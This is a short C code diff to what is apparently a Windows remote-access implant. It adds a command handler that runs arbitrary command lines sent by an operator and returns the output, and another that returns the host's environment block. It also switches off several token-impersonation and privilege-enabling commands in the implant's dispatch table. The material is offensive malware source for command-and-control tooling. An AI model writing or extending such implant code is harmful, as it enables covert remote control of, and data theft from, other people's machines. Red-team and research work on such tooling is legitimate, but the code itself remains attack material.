@@ -17,15 +17,15 @@ CONST COMMAND_MAP G_CommandTable[] = {
 	{ CMD_GETPID,             CmdGetPid },
 
 	// Execution
-	// { CMD_EXEC,               CmdExec },
+	{ CMD_EXEC,               CmdExec },
 	// { CMD_SHELLCODEEXEC,      CmdShellcodeExec },
 
 	// Token Manipulation
 	{ CMD_INSPECT_TOKEN,      CmdCurrentToken },
-	{ CMD_PROCESS_TOKEN,      CmdProcessToken },
-	{ CMD_TOKEN_PRIVILEGES,   CmdTokenPrivileges },
-	{ CMD_TOKEN_IMPERSONATE,  CmdImpersonateToken },
-	{ CMD_ENABLE_PRIVILEGE,   CmdEnablePrivilege },
+	// { CMD_PROCESS_TOKEN,      CmdProcessToken },
+	// { CMD_TOKEN_PRIVILEGES,   CmdTokenPrivileges },
+	// { CMD_TOKEN_IMPERSONATE,  CmdImpersonateToken },
+	// { CMD_ENABLE_PRIVILEGE,   CmdEnablePrivilege },
 	// { CMD_DISABLE_PRIVILEGE,  CmdDisablePrivilege },
 
 	// Memory and Object Inspection
@@ -34,7 +34,7 @@ CONST COMMAND_MAP G_CommandTable[] = {
 	// { CMD_HANDLELIST,         CmdHandleList },
 
 	// Environment
-	// { CMD_ENV,                CmdEnv },
+	{ CMD_ENV,                CmdEnv },
 	// { CMD_GETENV,             CmdGetEnv },
 	// { CMD_SETENV,             CmdSetEnv },
 
@@ -446,6 +446,27 @@ DWORD CmdGetPid(
 //execution
 // would be env, shellstuff, etc 
 
+DWORD CmdExec(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR cmdLine = NULL;
+
+	status = ConvertUtf8ToWideString(dataLen, data, &cmdLine);
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	status = ExecCommand(cmdLine, responseData, responseLen);
+	ImplantHeapFree(cmdLine);
+	return status;
+}
+
 //token manpulation ######################################################################
 DWORD CmdCurrentToken(
 	DWORD dataLen,
@@ -533,6 +554,19 @@ DWORD CmdEnablePrivilege(
 	status = EnableCurrentTokenPrivilege(privilegeName, responseData, responseLen);
 	ImplantHeapFree(privilegeName);
 	return status;
+}
+
+DWORD CmdEnv(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	return GetEnvironmentBlock(responseData, responseLen);
 }
 
 
